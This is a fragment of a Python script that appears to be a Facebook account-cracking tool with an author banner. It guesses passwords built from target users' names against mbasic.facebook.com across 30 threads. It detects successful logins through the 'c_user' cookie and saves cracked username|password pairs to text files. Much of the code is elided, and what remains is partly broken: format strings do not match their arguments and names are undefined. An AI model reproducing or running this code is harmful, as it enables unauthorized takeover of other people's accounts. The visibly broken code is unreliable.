...
from concurrent.futures import ThreadPoolExecutor as mrCHAND
...
ðŸ¥µ \033[1;33m/ALL\        \033[1;34m/THE\      \033[1;31m/FUCK\ ðŸ¥µ

\033[1;35mâœ…____________________ðŸ’Ÿ________________________âœ…

  Auther   : irtaza guru
  \033[1;37mTEAM     : tera bhai alone hai 
  \033[1;36mYoutube  : no use
  \033[1;37mNote     : FREE TRAILER FEWS DAYS
  \033[1;35maccount Fb : https://www.facebook.com/m.meirtaza
âœ…____________________ðŸ’Ÿ________________________âœ…
"""
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mCHAND_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mCHAND_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back CHAND Menu ")
	    mr()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[CHAND] {loop}|{len(self.id)} \033[1;32m[ok][{len(ok)}] \033[1;31m[cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [GURU-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('GURU_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with mrCHAND(max_workers=30) as CHANDworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        CHANDworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
                ...
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        guruworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
